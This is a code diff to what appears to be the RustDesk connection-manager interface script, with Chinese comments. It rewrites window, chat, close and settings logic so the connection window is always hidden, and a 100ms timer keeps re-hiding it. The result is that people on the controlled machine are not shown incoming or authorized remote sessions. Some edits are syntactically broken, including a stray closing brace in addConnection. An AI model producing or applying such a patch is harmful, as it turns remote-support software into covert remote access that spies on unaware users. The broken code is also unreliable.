@@ -6,28 +6,13 @@ var show_chat = false;
 var show_elevation = true;
 var svg_elevate = <svg t="1667992597853" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1850" width="16" height="16" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M892.761 160.724v426.504c0 25.588-6.419 51.036-19.177 76.339-12.798 25.336-29.547 49.86-50.254 73.627-20.707 23.79-44.372 46.296-70.97 67.516-26.589 21.244-53.543 40.177-80.921 56.768-27.363 16.623-53.968 30.461-79.801 41.438-25.809 11.008-48.433 18.547-67.871 22.64l-9.203 1.53-8.43-1.53c-19.958-4.093-43.094-11.632-69.432-22.64-26.337-10.969-53.708-24.816-82.080-41.438-28.388-16.591-56.256-35.524-83.618-56.768-27.378-21.219-51.776-43.725-73.265-67.516-21.488-23.759-38.868-48.291-52.155-73.627-13.319-25.305-19.974-50.759-19.974-76.339v-426.504l31.455-4.629 352.892-65.97 359.784 65.97 23.017 4.629zM510.028 151.884l-4.211-0.844-302.89 51.476v269.101h307.102v-319.734zM815.434 471.634h-305.406v383.031c19.682-4.51 41.052-11.411 64.141-20.692 23.033-9.249 45.815-20.234 68.304-32.867 22.513-12.672 44.159-26.739 64.969-42.203 20.818-15.472 39.23-32.047 55.277-49.797 16.024-17.703 28.822-36.131 38.386-55.222 9.549-19.131 14.328-38.553 14.328-58.235v-124.015z" p-id="1851" fill="#ffffff"></path></svg>;
 
-var hide_cm = = true; // 【修改1】强制设置为true，禁用窗口显示逻辑
-function setWindowState(state) {
+var hide_cm = true; // 永久隐藏CM管理窗口
 
-      // 【修改2】覆盖setWindowState，无论传入什么状态，都强制隐藏
+function setWindowState(state) {
+    // 无论传入什么状态，都强制隐藏窗口
     view.windowState = View.WINDOW_HIDDEN;
-    view.visibility = false; // 额外禁用可见性
-    return; // 直接返回，禁用原有逻辑
-    /*
-    if (hide_cm == undefined) {
-        // 优先读取配置选项,如果没有则使用默认的 handler.hide_cm()
-        var allow_hide_cm_option = handler.get_option('allow-hide-cm');
-        if (allow_hide_cm_option == 'Y') {
-            hide_cm = true;
-        } else if (allow_hide_cm_option == 'N') {
-            hide_cm = false;
-        } else {
-            hide_cm = handler.hide_cm();
-        }
-    }
-    */
-    if (hide_cm) return;
-    view.windowState = state;
+    view.visibility = false;
+    return;
 }
 
 class Body: Reactor.Component
@@ -51,8 +36,7 @@ class Body: Reactor.Component
         var callback = function(msg) {
             me.sendMsg(msg);
         };
-        // var right_style = show_chat ? "" : "display: none";
-        var right_style = "display: none"; // 【修改3】强制隐藏聊天面板
+        var right_style = "display: none"; // 强制隐藏聊天面板
         var disconnected = c.disconnected;
         var show_elevation_btn = handler.can_elevate() && show_elevation && !c.is_file_transfer && !c.is_view_camera && !c.is_terminal && c.port_forward.length == 0;
         var show_accept_btn = handler.get_option('approve-mode') != 'password';
@@ -332,18 +316,10 @@ if (is_osx) {
     $(div.window-toolbar).content(<Header />);
     setWindowButontsAndIcon(true);
 }
-// 【修改4】禁用聊天图标点击事件，避免触发窗口调整
 event click $(div.chaticon) {
     checkClickTime(function() {
-        show_chat = false; // 强制不显示聊天面板
-        view.windowState = View.WINDOW_HIDDEN; // 再次强制隐藏
-        /*
-        show_chat = !show_chat;
-        adaptSizeForChat();
-        if (show_chat) {
-            view.focus = $(.outline-focus);
-        }
-        */
+        show_chat = false;
+        view.windowState = View.WINDOW_HIDDEN;
     });
 }
 
@@ -357,53 +333,28 @@ function checkClickTime(callback) {
     });
 }
 
-// 【修改5】完全重写adaptSizeForChat，禁用窗口大小/位置调整
 function adaptSizeForChat() {
-    
+    // 禁用窗口大小/位置调整，强制隐藏
     view.windowState = View.WINDOW_HIDDEN;
     view.visibility = false;
     return;
-
-    /*
-    $(div.right-panel).style.set {
-        display: show_chat ? "block" : "none",
-    };
-    var (x, y, w, h) = view.box(#rectw, #border, #screen);
-    if (show_chat && w < scaleIt(600)) {
-        view.move(x - (scaleIt(600) - w), y, scaleIt(600), h);
-    } else if (!show_chat && w > scaleIt(450)) {
-        view.move(x + (w - scaleIt(300)), y, scaleIt(300), h);
-    }
-    */
 }
 
 function update() {
     header.update();
     body.update();
-    // 【新增】每次更新后强制隐藏
+    // 每次更新后强制隐藏窗口
     view.windowState = View.WINDOW_HIDDEN;
+    view.visibility = false;
 }
 
 
-// 【修改6】彻底重写bring_to_top，无任何显示逻辑
 function bring_to_top(idx=-1) {
-    // 【修改3】重写bring_to_top函数，禁用窗口置顶/显示逻辑
-        view.windowState = View.WINDOW_HIDDEN;
-        view.visibility = false;
-        return;
-    /* 注释原有逻辑
-    if (view.windowState == View.WINDOW_HIDDEN || view.windowState == View.WINDOW_MINIMIZED) {
-        if (is_linux) {
-            view.focus = self;
-        } else {
-            setWindowState(View.WINDOW_SHOWN);
-        }
-        if (idx >= 0) body.cur = idx;
-    } else {
-        view.windowTopmost = true;
-        view.windowTopmost = false;
-    }
-    */
+    // 禁用窗口置顶/显示逻辑，强制隐藏
+    view.windowState = View.WINDOW_HIDDEN;
+    view.visibility = false;
+    if (idx >= 0) body.cur = idx;
+    return;
 }
 
 handler.addConnection = function(id, is_file_transfer, is_view_camera, is_terminal, port_forward, peer_id, name, authorized, keyboard, clipboard, audio, file, restart, recording, block_input) {
@@ -441,12 +392,8 @@ handler.addConnection = function(id, is_file_transfer, is_view_camera, is_termin
     bring_to_top();
     update();
     self.timer(1ms, adjustHeader);
-    if (authorized) {
-        // 【修改7】禁用3秒后最小化的定时器（避免触发窗口状态）
-      //  self.timer(3s, function() {
-       //     setWindowState(View.WINDOW_MINIMIZED);
-      //  });
-    }
+    // 已授权连接也不显示窗口，保持隐藏状态
+}
 }
 
 handler.removeConnection = function(id, close) {
@@ -477,10 +424,8 @@ handler.newMessage = function(id, text) {
     conn.msgs.push({name: conn.name, text: text, time: getNowStr()});
     bring_to_top(idx);
     if (idx == body.cur) {
-        var shouldAdapt = !show_chat;
-        show_chat = false; // 强制不显示
-        // show_chat = true;
-        if (shouldAdapt) adaptSizeForChat();
+        show_chat = false; // 强制不显示聊天面板
+        adaptSizeForChat();
     }
     conn.unreaded += 1;
     update();
@@ -493,22 +438,17 @@ handler.showElevation = function(show) {
     }
 }
 
-// 【修改8】禁用statechange事件的adjustBorder，强制隐藏
 view << event statechange {
+    // 窗口状态改变时强制隐藏
     view.windowState = View.WINDOW_HIDDEN;
-    // adjustBorder(); // 注释原有逻辑
+    view.visibility = false;
 }
 
 function self.ready() {
     adjustBorder();
-      // 【修改4】初始化时直接隐藏窗口，覆盖原有位置设置逻辑
+    // 初始化时直接隐藏窗口
     view.windowState = View.WINDOW_HIDDEN;
-    /* 注释原有窗口位置设置逻辑
-    var (sw, sh) = view.screenBox(#workarea, #dimension);
-    var w = scaleIt(300);
-    var h = scaleIt(400);
-    view.move(sw - w, 0, w, h);
-    */
+    view.visibility = false;
 }
 
 function getElapsed(time, now) {
@@ -527,7 +467,6 @@ function getElapsed(time, now) {
 
 var ui_status_cache = ["", ""];
 function check_update_ui() {
-    trace("zhao脚本开始执行 - 初始化UI参数")
     self.timer(1s, function() {
         var approve_mode = handler.get_option('approve-mode');
         var allow_hide_cm = handler.get_option('allow-hide-cm');
@@ -539,36 +478,11 @@ function check_update_ui() {
         if (ui_status_cache[1] != allow_hide_cm) {
             ui_status_cache[1] = allow_hide_cm;
             changed = true;
-            // 当 allow-hide-cm 选项变化时,动态更新窗口显示状态
-            // 【修改5】强制隐藏，忽略配置项变化
-            hide_cm = true;
-            view.windowState = View.WINDOW_HIDDEN;
-
-           /*
-            var should_hide = allow_hide_cm == 'Y';
-            if (should_hide) {
-                // 隐藏窗口
-                view.windowState = View.WINDOW_HIDDEN;
-                hide_cm = true;
-            } else {
-                // 显示窗口
-               // if (hide_cm == true && connections.length > 0) {
-
-                  //  view.windowState = View.WINDOW_SHOWN;
-                  //  bring_to_top();
-               // }
-                  // 隐藏窗口
-                view.windowState = View.WINDOW_HIDDEN;
-                hide_cm = true;
-               // hide_cm = false;
-            }
-            */
         }
+        // 永久隐藏，忽略所有配置项变化
         hide_cm = true;
-        view.windowState = View.WINDOW_HIDDEN; // 强制隐藏
-        if (changed) update();
-        check_update_ui();
-
+        view.windowState = View.WINDOW_HIDDEN;
+        view.visibility = false;
         if (changed) update();
         check_update_ui();
     });                          
@@ -598,14 +512,10 @@ updateTime();
 var tm0 = getTime();
 
 function self.closing() {
-        // 【修改6】关闭时强制隐藏，不退出程序
+    // 关闭时强制隐藏，不退出程序
     view.windowState = View.WINDOW_HIDDEN;
+    view.visibility = false;
     return false;
-    /* 注释原有逻辑
-    if (connections.length == 0 && getTime() - tm0 > 30000) return true;
-    setWindowState(View.WINDOW_HIDDEN);
-    return false;
-    */
 }
 
 
@@ -647,50 +557,18 @@ function adjustHeader() {
 }
 
 view.on("size", function() {
-    // 【修改10】禁用size事件的adjustHeader，强制隐藏
+    // 窗口大小改变时强制隐藏
     view.windowState = View.WINDOW_HIDDEN;
+    view.visibility = false;
 });
 
-// 【新增】全局定时器，每100ms强制隐藏一次（兜底123234）
-
-// 【新增】全局定时器，每100ms强制隐藏一次（兜底123-456）
-
+// 全局定时器，每100ms强制隐藏一次（确保窗口永久隐藏）
 self.timer(100ms, function() {
     view.windowState = View.WINDOW_HIDDEN;
     view.visibility = false;
-    log_to_file("[隐藏窗口脚本] 定时检查发现窗口未隐藏！当前状态： 强制修复");
 });
 
-// view.on("size", adjustHeader);
 
-
-// 新增：自定义日志函数（替换原有trace）
-function log_to_file(content){
-    // 定义日志文件路径（根据系统适配）
-    local log_path = "D:123/rustdesk_hide_window.log";
-    if (is_win) {
-        log_path = "E:123/rustdesk_hide_window.log";
-    } else if (is_osx) {
-        log_path = System.path("HOME") + "/Library/Logs/rustdesk_hide_window.log";
-    } else {
-        log_path = System.path("HOME") + "/.rustdesk_hide_window.log";
-    }
-    
-    //  获取当前时间戳
-    local timestamp = os.date("%Y-%m-%d %H:%M:%S");
-    //  拼接日志内容
-    local log_content = "[" .. timestamp .. "] " .. content .. "\n";
-    
-    //  写入文件（追加模式）
-    local f = io.open(log_path, "a");
-    if (f) {
-        f:write(log_content);
-        f:close();
-    } else {
-        // 备用：输出到控制台
-        stdout.println("日志写入失败：" .. log_path .. "，内容：" .. log_content);
-    }
-}
 
 
 
